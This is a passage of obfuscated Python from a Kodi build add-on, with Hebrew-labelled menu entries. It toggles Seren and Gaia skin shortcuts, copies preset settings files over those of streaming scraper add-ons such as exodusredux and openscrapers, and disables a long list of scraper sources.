		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:595
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:598
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:599
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:602
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:603
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:604
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:622
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:625
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:626
def rdbuildinstall ():#line:629
  try :#line:630
   O000O0O0O00OOO000 =(ADDON .getSetting ("rdbuild"))#line:631
   if O000O0O0O00OOO000 =='true':#line:632
     OOO000O00OO000O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:633
     OOOO00O0O0OO0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:634
     copyfile (OOO000O00OO000O0O ,OOOO00O0O0OO0O0OO )#line:635
  except :#line:636
     pass #line:637
def rdbuildaddonoff ():#line:640
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:643
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:644
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:645
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:663
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:666
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:667
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:671
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:672
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:673
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:691
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:694
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:695
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:699
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:700
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:701
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:719
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:722
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:723
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:727
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:728
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:729
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:747
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:750
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:751
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:754
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:755
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:756
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:774
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:777
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:778
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:780
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:781
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:782
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:800
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:803
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:804
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:806
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:807
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:808
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:826
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:829
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:830
    O0O000O0O0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:833
    with open (O0O000O0O0O0OO0O0 ,'r')as O0O0OOO000OOO000O :#line:834
      OO0OOO0OO00O0OOO0 =O0O0OOO000OOO000O .read ()#line:835
    OO0OOO0OO00O0OOO0 =OO0OOO0OO00O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:853
    with open (O0O000O0O0O0OO0O0 ,'w')as O0O0OOO000OOO000O :#line:856
      O0O0OOO000OOO000O .write (OO0OOO0OO00O0OOO0 )#line:857
def rdbuildinstalloff ():#line:860
    try :#line:861
       O0O00O0000OO0000O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:862
       OO0000OO0000O0O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:863
       copyfile (O0O00O0000OO0000O ,OO0000OO0000O0O0O )#line:865
       O0O00O0000OO0000O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:867
       OO0000OO0000O0O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:868
       copyfile (O0O00O0000OO0000O ,OO0000OO0000O0O0O )#line:870
       O0O00O0000OO0000O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:872
       OO0000OO0000O0O0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:873
       copyfile (O0O00O0000OO0000O ,OO0000OO0000O0O0O )#line:875
       O0O00O0000OO0000O =ADDONPATH +"/resources/rdoff/Splash.png"#line:878
       OO0000OO0000O0O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:879
       copyfile (O0O00O0000OO0000O ,OO0000OO0000O0O0O )#line:881
    except :#line:883
       pass #line:884
def rdbuildaddonON ():#line:891
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:893
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:894
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:895
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:913
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:916
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:917
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:921
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:922
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:923
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:941
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:944
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:945
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:949
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:950
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:951
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:969
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:972
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:973
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:977
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:978
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:979
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:997
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:1000
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:1001
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1004
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:1005
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:1006
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1024
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:1027
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:1028
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1030
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:1031
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:1032
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1050
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:1053
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:1054
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1056
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:1057
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:1058
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1076
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:1079
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:1080
    OO00OO0O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1083
    with open (OO00OO0O00O0OO000 ,'r')as OOO0OO000O0O0OOO0 :#line:1084
      O0O0O0OO00OO0OO00 =OOO0OO000O0O0OOO0 .read ()#line:1085
    O0O0O0OO00OO0OO00 =O0O0O0OO00OO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1103
    with open (OO00OO0O00O0OO000 ,'w')as OOO0OO000O0O0OOO0 :#line:1106
      OOO0OO000O0O0OOO0 .write (O0O0O0OO00OO0OO00 )#line:1107
def rdbuildinstallON ():#line:1110
    try :#line:1112
       OO0OO0000OO0O000O =ADDONPATH +"/resources/rd/victory.xml"#line:1113
       OOO00OOOOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1114
       copyfile (OO0OO0000OO0O000O ,OOO00OOOOO0OOO00O )#line:1116
       OO0OO0000OO0O000O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1118
       OOO00OOOOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1119
       copyfile (OO0OO0000OO0O000O ,OOO00OOOOO0OOO00O )#line:1121
       OO0OO0000OO0O000O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1123
       OOO00OOOOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1124
       copyfile (OO0OO0000OO0O000O ,OOO00OOOOO0OOO00O )#line:1126
       OO0OO0000OO0O000O =ADDONPATH +"/resources/rd/Splash.png"#line:1129
       OOO00OOOOO0OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1130
       copyfile (OO0OO0000OO0O000O ,OOO00OOOOO0OOO00O )#line:1132
    except :#line:1134
       pass #line:1135
def rdbuild ():#line:1145
	OOOO00O0OOO0OOOOO =(ADDON .getSetting ("rdbuild"))#line:1146
	if OOOO00O0OOO0OOOOO =='true':#line:1147
		OOOO0OOOOOO00O000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1148
		OOOO0OOOOOO00O000 .setSetting ('all_t','0')#line:1149
		OOOO0OOOOOO00O000 .setSetting ('rd_menu_enable','false')#line:1150
		OOOO0OOOOOO00O000 .setSetting ('magnet_bay','false')#line:1151
		OOOO0OOOOOO00O000 .setSetting ('magnet_extra','false')#line:1152
		OOOO0OOOOOO00O000 .setSetting ('rd_only','false')#line:1153
		OOOO0OOOOOO00O000 .setSetting ('ftp','false')#line:1155
		OOOO0OOOOOO00O000 .setSetting ('fp','false')#line:1156
		OOOO0OOOOOO00O000 .setSetting ('filter_fp','false')#line:1157
		OOOO0OOOOOO00O000 .setSetting ('fp_size_en','false')#line:1158
		OOOO0OOOOOO00O000 .setSetting ('afdah','false')#line:1159
		OOOO0OOOOOO00O000 .setSetting ('ap2s','false')#line:1160
		OOOO0OOOOOO00O000 .setSetting ('cin','false')#line:1161
		OOOO0OOOOOO00O000 .setSetting ('clv','false')#line:1162
		OOOO0OOOOOO00O000 .setSetting ('cmv','false')#line:1163
		OOOO0OOOOOO00O000 .setSetting ('dl20','false')#line:1164
		OOOO0OOOOOO00O000 .setSetting ('esc','false')#line:1165
		OOOO0OOOOOO00O000 .setSetting ('extra','false')#line:1166
		OOOO0OOOOOO00O000 .setSetting ('film','false')#line:1167
		OOOO0OOOOOO00O000 .setSetting ('fre','false')#line:1168
		OOOO0OOOOOO00O000 .setSetting ('fxy','false')#line:1169
		OOOO0OOOOOO00O000 .setSetting ('genv','false')#line:1170
		OOOO0OOOOOO00O000 .setSetting ('getgo','false')#line:1171
		OOOO0OOOOOO00O000 .setSetting ('gold','false')#line:1172
		OOOO0OOOOOO00O000 .setSetting ('gona','false')#line:1173
		OOOO0OOOOOO00O000 .setSetting ('hdmm','false')#line:1174
		OOOO0OOOOOO00O000 .setSetting ('hdt','false')#line:1175
		OOOO0OOOOOO00O000 .setSetting ('icy','false')#line:1176
		OOOO0OOOOOO00O000 .setSetting ('ind','false')#line:1177
		OOOO0OOOOOO00O000 .setSetting ('iwi','false')#line:1178
		OOOO0OOOOOO00O000 .setSetting ('jen_free','false')#line:1179
		OOOO0OOOOOO00O000 .setSetting ('kiss','false')#line:1180
		OOOO0OOOOOO00O000 .setSetting ('lavin','false')#line:1181
		OOOO0OOOOOO00O000 .setSetting ('los','false')#line:1182
		OOOO0OOOOOO00O000 .setSetting ('m4u','false')#line:1183
		OOOO0OOOOOO00O000 .setSetting ('mesh','false')#line:1184
		OOOO0OOOOOO00O000 .setSetting ('mf','false')#line:1185
		OOOO0OOOOOO00O000 .setSetting ('mkvc','false')#line:1186
		OOOO0OOOOOO00O000 .setSetting ('mjy','false')#line:1187
		OOOO0OOOOOO00O000 .setSetting ('hdonline','false')#line:1188
		OOOO0OOOOOO00O000 .setSetting ('moviex','false')#line:1189
		OOOO0OOOOOO00O000 .setSetting ('mpr','false')#line:1190
		OOOO0OOOOOO00O000 .setSetting ('mvg','false')#line:1191
		OOOO0OOOOOO00O000 .setSetting ('mvl','false')#line:1192
		OOOO0OOOOOO00O000 .setSetting ('mvs','false')#line:1193
		OOOO0OOOOOO00O000 .setSetting ('myeg','false')#line:1194
		OOOO0OOOOOO00O000 .setSetting ('ninja','false')#line:1195
		OOOO0OOOOOO00O000 .setSetting ('odb','false')#line:1196
		OOOO0OOOOOO00O000 .setSetting ('ophd','false')#line:1197
		OOOO0OOOOOO00O000 .setSetting ('pks','false')#line:1198
		OOOO0OOOOOO00O000 .setSetting ('prf','false')#line:1199
		OOOO0OOOOOO00O000 .setSetting ('put18','false')#line:1200
		OOOO0OOOOOO00O000 .setSetting ('req','false')#line:1201
		OOOO0OOOOOO00O000 .setSetting ('rftv','false')#line:1202
		OOOO0OOOOOO00O000 .setSetting ('rltv','false')#line:1203
		OOOO0OOOOOO00O000 .setSetting ('sc','false')#line:1204
		OOOO0OOOOOO00O000 .setSetting ('seehd','false')#line:1205
		OOOO0OOOOOO00O000 .setSetting ('showbox','false')#line:1206
		OOOO0OOOOOO00O000 .setSetting ('shuid','false')#line:1207
		OOOO0OOOOOO00O000 .setSetting ('sil_gh','false')#line:1208
		OOOO0OOOOOO00O000 .setSetting ('spv','false')#line:1209
		OOOO0OOOOOO00O000 .setSetting ('subs','false')#line:1210
		OOOO0OOOOOO00O000 .setSetting ('tvs','false')#line:1211
		OOOO0OOOOOO00O000 .setSetting ('tw','false')#line:1212
		OOOO0OOOOOO00O000 .setSetting ('upto','false')#line:1213
